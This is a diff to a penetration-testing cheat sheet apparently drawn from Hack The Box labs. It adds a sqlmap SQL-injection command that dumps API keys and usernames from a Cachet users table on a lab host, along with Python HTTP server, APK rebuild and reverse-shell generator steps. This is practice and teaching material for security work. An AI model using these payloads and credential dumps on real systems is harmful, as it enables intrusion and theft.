@@ -779,7 +779,7 @@ For getting a shell
 
 Parameter
 
-    sqlmap -u "http://status.catch.htb:8000/api/v1/components?name=1&1[0]=&1[1]=a&1[2]=&1[3]=or+%27a%27=%3F%20and%201=1)*+--+"
+    sqlmap -u "http://status.catch.htb:8000/api/v1/components?name=1&1[0]=&1[1]=a&1[2]=&1[3]=or+%27a%27=%3F%20and%201=1)*+--+" --dbms=mysql -D cachet -T users -C api_key,username --dump
 
 **Local File Inclusion (LFI)**
 
@@ -851,6 +851,16 @@ host the file with python server
 
     service apache2 stop
     python -m SimpleHTTPServer 80
+
+*In Python3*
+
+No module named SimpleHTTPServer error is ModuleNotFoundError in Python.
+
+If you are using Python3 and try to start the SimpleHTTPServer, you will get the error like No module named SimpleHTTPServer. 
+
+It is because it is merged with http.server module. You can use the below command to run the python http server in Python 3.
+
+    python -m http.server 80
 
 python give you debug information
 
@@ -1229,7 +1239,13 @@ Search for flags as well
 
 Decompile with APK Tools makes dex to smali and make the manifest readable .bin -> .xml
 
-    apktool d <apk>
+    apktool d <apk> 
+
+Rebuild APK 
+
+Download a non dirty version from https://bitbucket.org/iBotPeaches/apktool/downloads/
+
+    java -jar apktool_2.6.1.jar b -r -f <folder>
 
 Decomplie dex to java
 
@@ -1663,9 +1679,14 @@ http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
 Generator
 
 https://www.revshells.com/
+https://github.com/evildevill/revshells
+
+Build and run local Version with docker
+
+    docker build -t reverse_shell_generator .
+    docker run -d -p 80:80 reverse_shell_generator
 
     https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md 
-
 
 *Docker*
 
